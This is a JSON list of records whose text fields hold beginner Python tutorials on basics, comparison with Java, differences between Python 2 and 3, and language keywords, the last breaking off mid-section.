[
  {
    "id": "1de37b0c6851c6651cfa84da84e9666c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a widely used general-purpose, high level programming language. It was created by Guido van Rossum in 1991 and further developed by the Python Software Foundation. It was designed with an emphasis on code readability, and its syntax allows programmers to express their concepts in fewer lines of code.Python is a programming language that lets you work quickly and integrate systems more efficiently.There are two major Python versions: Python 2 and Python 3. Both are quite different.Beginning with Python programming:1) Finding an Interpreter:Before we start Python programming, we need to have an interpreter to interpret and run our programs. There are certain online interpreters like https://ide.geeksforgeeks.org/, http://ideone.com/ or http://codepad.org/ that can be used to run Python programs without installing an interpreter.Windows: There are many interpreters available freely to run Python scripts like IDLE (Integrated Development Environment) that comes bundled with the Python software downloaded from http://python.org/.Linux: Python comes preinstalled with popular Linux distros such as Ubuntu and Fedora. To check which version of Python you\u2019re running, type \u201cpython\u201d in the terminal emulator. The interpreter should start and print the version number.macOS: Generally, Python 2.7 comes bundled with macOS. You\u2019ll have to manually install Python 3 from http://python.org/.2) Writing our first program:Just type in the following code after you start the interpreter.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Script Begins\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"GeeksQuiz\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Scripts Ends\u00a0\u00a0\u00a0\u00a0\u00a0Output:GeeksQuizLet\u2019s analyze the script line by line.Line 1: [# Script Begins] In Python, comments begin with a #. This statement is ignored by the interpreter and serves as documentation for our code.Line 2: [print(\u201cGeeksQuiz\u201d)] To print something on the console, print() function is used. This function also adds a newline after our message is printed(unlike in C). Note that in Python 2, \u201cprint\u201d is not a function but a keyword and therefore can be used without parentheses. However, in Python 3, it is a function and must be invoked with parentheses.Line 3: [# Script Ends] This is just another comment like in Line 1.Please comment if you find anything incorrect, or if you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e661741b1eb6204e41782a4c3e94db13",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python was developed by Guido van Rossum in the early 1990s and its latest version is 3.7.1, we can simply call it as Python3. Python 3.0 was released in 2008. and is interpreted language i.e it\u2019s not compiled and the interpreter will check the code line by line. This article can used to learn very basics of Python programming language.So before moving on further.. let\u2019s do the most popular \u2018HelloWorld\u2019 tradition \ud83d\ude1b and hence compare Python\u2019s Syntax with C, C++, Java ( I have taken these 3 because they are most famous and mostly used languages).# Python code for \"Hello World\"# nothing else to type...see how simple is the syntax.\u00a0\u00a0print(\"Hello World\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Note: Please note that Python for its scope doesn\u2019t depend on the braces ( { } ), instead it uses indentation for its scope.Now moving on further Lets start our basics of Python . I will be covering the basics in some small sections. Just go through them and trust me you\u2019ll learn the basics of Python very easily.Introduction and SetupIf you are on Windows OS download Python by Clicking here and now install from the setup and in the start menu type IDLE.IDLE, you can think it as an Python\u2019s IDE to run the Python Scripts.It will look somehow this :If you are on Linux/Unix-like just open the terminal and on 99% linux OS Python comes preinstalled with the OS.Just type \u2018python3\u2019 in terminal and you are ready to go.It will look like this :The \u201d >>> \u201d represents the python shell and its ready to take python commands and code.Variables and Data StructuresIn other programming languages like C, C++, and Java, you will need to declare the type of variables but in Python you don\u2019t need to do that. Just type in the variable and when values will be given to it, then it will automatically know whether the value given would be an int, float, or char or even a String.# Python program to declare variablesmyNumber = 3print(myNumber)\u00a0\u00a0myNumber2 = 4.5print(myNumber2)\u00a0\u00a0myNumber =\"helloworld\"print(myNumber)Output:3\r\n4.5\r\nhelloworld\r\nSee, how simple is it, just create a variable and assign it any value you want and then use the print function to print it. Python have 4 types of built in Data Structures namely List, Dictionary, Tuple and Set.List is the most basic Data Structure in python. List is a mutable data structure i.e items can be added to list later after the list creation. It\u2019s like you are going to shop at the local market and made a list of some items and later on you can add more and more items to the list.append() function is used to add data to the list.# Python program to illustrate a list\u00a0\u00a0\u00a0# creates a empty listnums = []\u00a0\u00a0\u00a0# appending data in listnums.append(21)nums.append(40.5)nums.append(\"String\")\u00a0\u00a0print(nums)Output:[21, 40.5, String]Comments:# is used for single line comment in Python\r\n\"\"\" this is a comment \"\"\" is used for multi line commentsInput and OutputIn this section, we will learn how to take input from the user and hence manipulate it or simply display it. input() function is used to take input from the user.# Python program to illustrate# getting input from username = input(\"Enter your name: \")\u00a0\u00a0\u00a0# user entered the name 'harssh'print(\"hello\", name)Output:hello harssh   # Python3 program to get input from user\u00a0\u00a0# accepting integer from the user# the return type of input() function is string ,# so we need to convert the input to integernum1 = int(input(\"Enter num1: \"))num2 = int(input(\"Enter num2: \"))\u00a0\u00a0num3 = num1 * num2print(\"Product is: \", num3)Output:Enter num1: 8 Enter num2: 6 ('Product is: ', 48)\r\nSelectionSelection in Python is made using the two keywords \u2018if\u2019 and \u2018elif\u2019 and else (elseif)# Python program to illustrate# selection statement\u00a0\u00a0num1 = 34if(num1>12):\u00a0\u00a0\u00a0\u00a0print(\"Num1 is good\")elif(num1>35):\u00a0\u00a0\u00a0\u00a0print(\"Num2 is not gooooo....\")else:\u00a0\u00a0\u00a0\u00a0print(\"Num2 is great\")Output:Num1 is goodFunctionsYou can think of functions like a bunch of code that is intended to do a particular task in the whole Python script. Python used the keyword \u2018def\u2019 to define a function.Syntax:def function-name(arguments):\r\n            #function body# Python program to illustrate# functionsdef hello():\u00a0\u00a0\u00a0\u00a0print(\"hello\")\u00a0\u00a0\u00a0\u00a0print(\"hello again\")hello()\u00a0\u00a0# calling functionhello()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Output:hello\r\nhello again\r\nhello\r\nhello again\r\nNow as we know any program starts from a \u2018main\u2019 function\u2026lets create a main function like in many other programming languages.# Python program to illustrate\u00a0# function with maindef getInteger():\u00a0\u00a0\u00a0\u00a0result = int(input(\"Enter integer: \"))\u00a0\u00a0\u00a0\u00a0return result\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0print(\"Started\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calling the getInteger function and\u00a0\u00a0\u00a0\u00a0\u00a0# storing its returned value in the output variable\u00a0\u00a0\u00a0\u00a0output = getInteger()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(output)\u00a0\u00a0# now we are required to tell Python\u00a0# for 'Main' function existenceif __name__==\"__main__\":\u00a0\u00a0\u00a0\u00a0Main()Output:Started\r\nEnter integer: 5\r\nIteration (Looping)As the name suggests it calls repeating things again and again. We will use the most popular \u2018for\u2019 loop here.# Python program to illustrate# a simple for loop\u00a0\u00a0for step in range(5):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(step)Output:0\r\n1\r\n2\r\n3\r\n4\r\nModulesPython has a very rich module library that has several functions to do many tasks. You can read more about Python\u2019s standard library by Clicking here\u2018import\u2019 keyword is used to import a particular module into your python code. For instance consider the following program.# Python program to illustrate# math moduleimport math\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0num = -85\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fabs is used to get the absolute\u00a0\u00a0\u00a0\u00a0\u00a0# value of a decimal\u00a0\u00a0\u00a0\u00a0num = math.fabs(num)\u00a0\u00a0\u00a0\u00a0\u00a0print(num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if __name__==\"__main__\":\u00a0\u00a0\u00a0\u00a0Main()Output:85.0These are some of the most basics of the Python programming language and I will be covering both the intermediate and advanced level Python topics in my upcoming articles.This article is contributed by Harsh Wardhan Chaudhary. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Your article will be reviewed first by Geeks for Geeks team before publishing.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e4b77c039097607b6d7462391971c964",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python designed by\u00a0Guido van Rossum\u00a0at\u00a0CWI\u00a0has become a widely used general-purpose, high-level programming language.Prerequisites:Knowledge of any programming language can be a plus.Reason for increasing popularityEmphasis on code readability, shorter codes, ease of\u00a0writingProgrammers can express logical concepts in fewer lines of code in comparison to languages such as C++ or Java.Python supports multiple programming paradigms, like object-oriented, imperative and functional programming or procedural.There exists inbuilt functions for almost all of the frequently used concepts.Philosophy is \u201cSimplicity is the best\u201d.LANGUAGE FEATURESInterpretedThere are no separate compilation and execution steps like C and C++.Directly\u00a0run the program from the source code.Internally, Python converts the source code into an intermediate form called bytecodes which is then translated into native language of specific computer to run it.No need to worry about linking and loading with libraries, etc.Platform IndependentPython programs can be developed and executed on multiple operating system platforms.Python can be used on Linux, Windows, Macintosh, Solaris and many more.Free and Open Source; RedistributableHigh-level LanguageIn Python, no need to take care about low-level details such as managing the memory used by the program.SimpleCloser to English language;Easy to LearnMore emphasis on the solution to the problem rather than the syntaxEmbeddablePython can be used within C/C++ program to give scripting capabilities for the program\u2019s users.Robust:Exceptional handling featuresMemory management techniques in builtRich Library SupportThe Python Standard Library is vary vast.Known as the \u201cbatteries included\u201d philosophy of Python ;It can help do various things involving regular expressions, documentation generation, unit testing, threading, databases, web browsers, CGI, email, XML, HTML, WAV files, cryptography, GUI and many more.Besides the standard library, there are various other high-quality libraries such as the\u00a0Python Imaging Library\u00a0which is an amazingly simple image manipulation library.Python vs JAVAPythonJavaDynamically Typed1.No need to\u00a0declare anything. An assignment statement binds a name to an object, and the object can be of any type.2.No type casting required when using container objectsStatically Typed\u00a01.All variable names (along with their types) must be explicitly declared. Attempting to assign an object of the wrong type to a variable name triggers a type exception.2.Type casting is required when using container objects.Concise\u00a0Express much in limited wordsVerboseContains more wordsCompactLess CompactUses Indentation for structuring codeUses braces for structuring codeThe classical Hello World program illustrating the relative verbosity of a Java Program and Python ProgramJava Codepublic class HelloWorld{\u00a0\u00a0\u00a0public static void main (String[] args)\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(\"Hello, world!\");\u00a0\u00a0\u00a0}}Python Codeprint(\"Hello, world!\")Similarity with JavaRequire some form of runtime on your system (JVM/Python runtime)Can probably be compiled to executables without the runtime (this is situational, none of them are designed to work this way)LOOK and FEEL of the PythonGUICommand Line interfaceSoftwares making use of PythonPython has been successfully embedded in a number of software products as a scripting language.GNU Debugger uses Python as a pretty printer to show complex structures such as C++ containers.Python has also been used in artificial intelligencePython is often used for natural language processing tasks.Current Applications of PythonA number of Linux distributions use installers written in Python example in Ubuntu we have the UbiquityPython has seen extensive use in the information security industry, including in exploit development.Raspberry Pi\u2013 single board computer uses Python as its principal user-programming language.Python is now being used Game Development areas also.Pros:Ease of useMulti-paradigm ApproachCons:Slow speed of execution compared to C,C++Absence from mobile computing and browsersFor the C,C++ programmers switching to python can be irritating as the language requires proper indentation of code. Certain variable names commonly used like sum are functions in python. So C, C++ programmers have to look out for these.Industrial ImportanceMost of the companies are now looking for candidates who know about Python Programming. Those having the knowledge of python may have more chances of impressing the interviewing panel. So I would suggest that beginners should start learning python and excel in it.GeeksforGeeks is very soon going to introduce programming in Python too.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.Article By Mudit Maheshwari:A 3rd-year B.Tech IT student from VIT University, Vellore having a keen\u00a0interest in coding, learning about new technology, and developing software. Besides being passionate\u00a0about coding, he also loves playing guitar and singing. Currently staying in Chennai. You can reach him at\u00a0mudit94@gmail.com.If you also wish to showcase your blog here,please see GBlog for guest blog writing on GeeksforGeeks.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9ec2a7af4b64b0242f5a0c7d3caf5851",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Division operatorprint functionUnicodexrangeError Handling_future_ moduleDivision operatorIf we are porting our code or executing python 3.x code in python 2.x, it can be dangerous if integer division changes go unnoticed (since it doesn\u2019t raise any error). It is preferred to use the floating value (like 7.0/5 or 7/5.0) to get the expected result when porting our code.\u00a0\u00a0Pythonprint 7 / 5\u00a0print -7 / 5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x\u00a01\u00a0-2\u00a0Output in Python 3.x :\u00a01.4\u00a0-1.4\u00a0\u00a0\u00a0\u00a0\u00a0# Refer below link for details\u00a0# https://www.geeksforgeeks.org/division-operator-in-python/\u00a0'''print functionThis is the most well-known change. In this, the print keyword in Python 2.x is replaced by the print() function in Python 3.x. However, parentheses work in Python 2 if space is added after the print keyword because the interpreter evaluates it as an expression.\u00a0\u00a0Pythonprint 'Hello, Geeks'\u00a0\u00a0\u00a0\u00a0\u00a0 # Python 3.x doesn't support\u00a0print('Hope You like these facts')\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x :\u00a0Hello, Geeks\u00a0Hope You like these facts\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x :\u00a0File \"a.py\", line 1\u00a0\u00a0\u00a0\u00a0\u00a0print 'Hello, Geeks'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^\u00a0SyntaxError: invalid syntax\u00a0\u00a0\u00a0\u00a0\u00a0Refer below link for details\u00a0https://www.geeksforgeeks.org/g-fact-25-print-single-multiple-variable-python/\u00a0'''As we can see, if we use parentheses in python 2.x then there is no issue but if we don\u2019t use parentheses in python 3.x, we get SyntaxError.\u00a0\u00a0Unicode:In Python 2, an implicit str type is ASCII. But in Python 3.x implicit str type is Unicode.\u00a0\u00a0Pythonprint(type('default string '))\u00a0print(type(b'string with b '))\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x (Bytes is same as str)\u00a0<type 'str'>\u00a0<type 'str'>\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x (Bytes and str are different)\u00a0<class 'str'>\u00a0<class 'bytes'>\u00a0'''Python 2.x also supports Unicode\u00a0\u00a0Pythonprint(type('default string '))\u00a0print(type(u'string with b '))\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x (Unicode and str are different)\u00a0<type 'str'>\u00a0<type 'unicode'>\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x (Unicode and str are same)\u00a0<class 'str'>\u00a0<class 'str'>\u00a0'''xrange:xrange() of Python 2.x doesn\u2019t exist in Python 3.x. In Python 2.x, range returns a list i.e. range(3) returns [0, 1, 2] while xrange returns a xrange object i. e., xrange(3) returns iterator object which works similar to Java iterator and generates number when needed.\u00a0If we need to iterate over the same sequence multiple times, we prefer range() as range provides a static list. xrange() reconstructs the sequence every time. xrange() doesn\u2019t support slices and other list methods. The advantage of xrange() is, it saves memory when the task is to iterate over a large range.\u00a0In Python 3.x, the range function now does what xrange does in Python 2.x, so to keep our code portable, we might want to stick to using a range instead. So Python 3.x\u2019s range function is xrange from Python 2.x.\u00a0\u00a0Pythonfor x in xrange(1, 5):\u00a0\u00a0\u00a0\u00a0\u00a0print(x),\u00a0\u00a0\u00a0\u00a0\u00a0for x in range(1, 5):\u00a0\u00a0\u00a0\u00a0\u00a0print(x),\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x\u00a01 2 3 4 1 2 3 4\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x\u00a0NameError: name 'xrange' is not defined\u00a0'''Error Handling:There is a small change in error handling in both versions. In python 3.x, \u2018as\u2019 keyword is required.\u00a0\u00a0Pythontry:\u00a0\u00a0\u00a0\u00a0\u00a0trying_to_check_error\u00a0except NameError, err:\u00a0\u00a0\u00a0\u00a0\u00a0print err, 'Error Caused'\u00a0\u00a0 # Would not work in Python 3.x\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x:\u00a0name 'trying_to_check_error' is not defined Error Caused\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x :\u00a0File \"a.py\", line 3\u00a0\u00a0\u00a0\u00a0\u00a0except NameError, err:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0^\u00a0SyntaxError: invalid syntax\u00a0'''Pythontry:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0trying_to_check_error\u00a0except NameError as err: # 'as' is needed in Python 3.x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (err, 'Error Caused')\u00a0\u00a0\u00a0\u00a0\u00a0'''\u00a0Output in Python 2.x:\u00a0(NameError(\"name 'trying_to_check_error' is not defined\",), 'Error Caused')\u00a0\u00a0\u00a0\u00a0\u00a0Output in Python 3.x :\u00a0name 'trying_to_check_error' is not defined Error Caused\u00a0'''__future__ module:This is basically not a difference between the two versions, but a useful thing to mention here. The idea of the __future__ module is to help migrate to Python 3.x.\u00a0If we are planning to have Python 3.x support in our 2.x code, we can use _future_ imports in our code.\u00a0For example, in the Python 2.x code below, we use Python 3.x\u2019s integer division behavior using the __future__ module.\u00a0\u00a0Python# In below python 2.x code, division works\u00a0# same as Python 3.x because we use\u00a0 __future__\u00a0from __future__ import division\u00a0\u00a0\u00a0\u00a0\u00a0print 7 / 5\u00a0print -7 / 5Output :\u00a0\u00a01.4 \n\n-1.4 Another example where we use brackets in Python 2.x using __future__ module:\u00a0\u00a0Pythonfrom __future__ import print_function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('GeeksforGeeks')Output:\u00a0\u00a0GeeksforGeeks Refer to this for more details of the __future__ module.\u00a0\u00a0This article is contributed by Arpit Agarwal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "519a5c2771ce94986af746fe8098735a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python Keywords: IntroductionKeywords in Python are reserved words that can not be used as a variable name, function name, or any other identifier.List of all keywords in PythonandasassertbreakclasscontinuedefdelelifelseexceptFalsefinallyforfromglobalifimportinislambdaNonenonlocalnotorpassraisereturnTruetrywhilewithyield\u00a0\u00a0\u00a0We can also get all the keyword names using the below code.Example: Python Keywords List\u00a0Python3# Python code to demonstrate working of iskeyword()\u00a0\u00a0# importing \"keyword\" for keyword operationsimport keyword\u00a0\u00a0# printing all keywords at once using \"kwlist()\"print(\"The list of keywords is : \")print(keyword.kwlist)Output:The list of keywords is :\u00a0[\u2018False\u2019, \u2018None\u2019, \u2018True\u2019, \u2018and\u2019, \u2018as\u2019, \u2018assert\u2019, \u2018async\u2019, \u2018await\u2019, \u2018break\u2019, \u2018class\u2019, \u2018continue\u2019, \u2018def\u2019, \u2018del\u2019, \u2018elif\u2019, \u2018else\u2019, \u2018except\u2019, \u2018finally\u2019, \u2018for\u2019, \u2018from\u2019, \u2018global\u2019, \u2018if\u2019, \u2018import\u2019, \u2018in\u2019, \u2018is\u2019, \u2018lambda\u2019, \u2018nonlocal\u2019, \u2018not\u2019, \u2018or\u2019, \u2018pass\u2019, \u2018raise\u2019, \u2018return\u2019, \u2018try\u2019, \u2018while\u2019, \u2018with\u2019, \u2018yield\u2019]Let\u2019s discuss each keyword in detail with the help of good examples.True, False, NoneTrue: This keyword is used to represent a boolean true. If a statement is true, \u201cTrue\u201d is printed.False: This keyword is used to represent a boolean false. If a statement is false, \u201cFalse\u201d is printed.\u00a0None: This is a special constant used to denote a null value or a void. It\u2019s important to remember, 0, any empty container(e.g empty list) does not compute to None.\u00a0It is an object of its datatype \u2013 NoneType. It is not possible to create multiple None objects and can assign them to variables.Example: True, False, and None KeywordPython3print(False == 0)print(True == 1)\u00a0\u00a0print(True + True + True)print(True + False + False)\u00a0\u00a0print(None == 0)print(None == [])OutputTrue\r\nTrue\r\n3\r\n1\r\nFalse\r\nFalse\r\nand, or, not, in, isand: This a logical operator in python. \u201cand\u201d Return the first false value. If not found return last. The truth table for \u201cand\u201d is depicted below.\u00a03 and 0 returns 0\u00a03 and 10 returns 10\u00a010 or 20 or 30 or 10 or 70 returns 10\u00a0The above statements might be a bit confusing to a programmer coming from a language like C where the logical operators always return boolean values(0 or 1). Following lines are straight from the python docs explaining this:The expression x and y first evaluates x; if x is false, its value is returned; otherwise, y is evaluated and the resulting value is returned.The expression x or y first evaluates x; if x is true, its value is returned; otherwise, y is evaluated and the resulting value is returned.Note that neither and nor or restrict the value and type they return to False and True, but rather return the last evaluated argument. This is sometimes useful, e.g., if s is a string that should be replaced by a default value if it is empty, the expression s or \u2018foo\u2019 yields the desired value. Because not has to create a new value, it returns a boolean value regardless of the type of its argument (for example, not \u2018foo\u2019 produces False rather than \u201d.)or: This a logical operator in python. \u201cor\u201d Return the first True value.if not found return last. The truth table for \u201cor\u201d is depicted below.\u00a0\u00a03 or 0 returns 3\u00a03 or 10 returns 3\u00a00 or 0 or 3 or 10 or 0 returns 3\u00a0not: This logical operator inverts the truth value. The truth table for \u201cnot\u201d is depicted below.\u00a0in: This keyword is used to check if a container contains a value. This keyword is also used to loop through the container.is: This keyword is used to test object identity, i.e to check if both the objects take the same memory location or not.\u00a0Example: and, or, not, is and in keywordPython# showing logical operation# or (returns True)print(True or False)\u00a0\u00a0# showing logical operation# and (returns False)print(False and True)\u00a0\u00a0# showing logical operation# not (returns False)print(not True)\u00a0\u00a0# using \"in\" to checkif 's' in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0print(\"s is part of geeksforgeeks\")else:\u00a0\u00a0\u00a0\u00a0print(\"s is not part of geeksforgeeks\")\u00a0\u00a0# using \"in\" to loop throughfor i in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0print(i, end=\" \")\u00a0\u00a0print(\"\\r\")\u00a0\u00a0# using is to check object identity# string is immutable( cannot be changed once allocated)# hence occupy same memory locationprint(' ' is ' ')\u00a0\u00a0# using is to check object identity# dictionary is mutable( can be changed once allocated)# hence occupy different memory locationprint({} is {})Output:\u00a0True\r\nFalse\r\nFalse\r\ns is part of geeksforgeeks\r\ng e e k s f o r g e e k s \r\nTrue\r\nFalseIteration Keywords \u2013 for, while, break, continuefor: This keyword is used to control flow and for looping.while: Has a similar working like \u201cfor\u201d, used to control flow and for looping.break: \u201cbreak\u201d is used to control the flow of the loop. The statement is used to break out of the loop and passes the control to the statement following immediately after loop.continue: \u201ccontinue\u201d is also used to control the flow of code. The keyword skips the current iteration of the loop but does not end the loop.Example: For, while, break, continue keywordPython3# Using for loopfor i in range(10):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end = \" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# break the loop as soon it sees 6\u00a0\u00a0\u00a0\u00a0if i == 6:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# loop from 1 to 10i = 0while i <10:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# If i is equals to 6,\u00a0\u00a0\u00a0\u00a0# continue to next iteration\u00a0\u00a0\u00a0\u00a0# without printing\u00a0\u00a0\u00a0\u00a0if i == 6:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i+= 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# otherwise print the value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# of i\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end = \" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1Output0 1 2 3 4 5 6 \r\n0 1 2 3 4 5 7 8 9 Conditional keywords \u2013 if, else, elifif : It is a control statement for decision making. Truth expression forces control to go in \u201cif\u201d statement block.else : It is a control statement for decision making. False expression forces control to go in \u201celse\u201d statement block.elif : It is a control statement for decision making. It is short for \u201celse if\u201cExample: if, else, and elif keywordPython3# Python program to illustrate if-elif-else ladder#!/usr/bin/python\u00a0\u00a0i = 20if (i == 10):\u00a0\u00a0\u00a0\u00a0print (\"i is 10\")elif (i == 20):\u00a0\u00a0\u00a0\u00a0print (\"i is 20\")else:\u00a0\u00a0\u00a0\u00a0print (\"i is not present\")Outputi is 20\r\nNote: For more information, refer to out Python if else Tutorial.defdef keyword is used to declare user defined functions.Example: def keywordPython3# def keyworddef fun():\u00a0\u00a0\u00a0\u00a0print(\"Inside Function\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fun()OutputInside Function\r\nReturn Keywords \u2013 Return, Yieldreturn : This keyword is used to return from the function.yield : This keyword is used like return statement but is used to return a generator.Example: Return and Yield KeywordPython3# Return keyworddef fun():\u00a0\u00a0\u00a0\u00a0S = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(10):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S += i\u00a0\u00a0\u00a0\u00a0return S\u00a0\u00a0print(fun())\u00a0\u00a0# Yield Keyworddef fun():\u00a0\u00a0\u00a0\u00a0S = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(10):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S += i\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield S\u00a0\u00a0for i in fun():\u00a0\u00a0\u00a0\u00a0print(i)Output45\r\n0\r\n1\r\n3\r\n6\r\n10\r\n15\r\n21\r\n28\r\n36\r\n45\r\nclassclass keyword is used to declare user defined classes.Example: Class KeywordPython3# Python3 program to# demonstrate instantiating# a class\u00a0\u00a0\u00a0\u00a0class Dog:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# A simple class\u00a0\u00a0\u00a0\u00a0# attribute\u00a0\u00a0\u00a0\u00a0attr1 = \"mammal\"\u00a0\u00a0\u00a0\u00a0attr2 = \"dog\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# A sample method\u00a0\u00a0\u00a0\u00a0def fun(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I'm a\", self.attr1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I'm a\", self.attr2)\u00a0\u00a0# Driver code# Object instantiationRodger = Dog()\u00a0\u00a0# Accessing class attributes# and method through objectsprint(Rodger.attr1)Rodger.fun()Outputmammal\r\nI'm a mammal\r\nI'm a dog\r\nNote: For more information, refer to our Python Classes and Objects Tutorial .Withwith keyword is used to wrap the execution of block of code within methods defined by context manager. This keyword is not used much in day to day programming.Example: With KeywordPython3# using with statementwith open('file_path', 'w') as file:\u00a0\u00a0\u00a0\u00a0file.write('hello world !')asas keyword is used to create the alias for the module imported. i.e giving a new name to the imported module. E.g import math as mymath.Example: as KeywordPython3import math as gfg\u00a0\u00a0print(gfg.factorial(5))Output120\r\npasspass is the null statement in python. Nothing happens when this is encountered. This is used to prevent indentation errors and used as a placeholder.Example: Pass KeywordPython3n = 10for i in range(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# pass can be used as placeholder# when code is to added laterpassLambdaLambda keyword is used to make inline returning functions with no statements allowed internally.\u00a0Example: Lambda KeywordPython3# Lambda keywordg = lambda x: x*x*x\u00a0\u00a0print(g(7))Output343\r\nImport, Fromimport : This statement is used to include a particular module into current program.from : Generally used with import, from is used to import particular functionality from the module imported.Example: Import, From KeywordPython3# import keywordimport mathprint(math.factorial(10))\u00a0\u00a0# from keywordfrom math import factorialprint(factorial(10))Output3628800\r\n3628800\r\nException Handling Keywords \u2013 try, except, raise, finally, and asserttry : This keyword is used for exception handling, used to catch the errors in the code using the keyword except. Code in \u201ctry\u201d block is checked, if there is any type of error, except block is executed.except : As 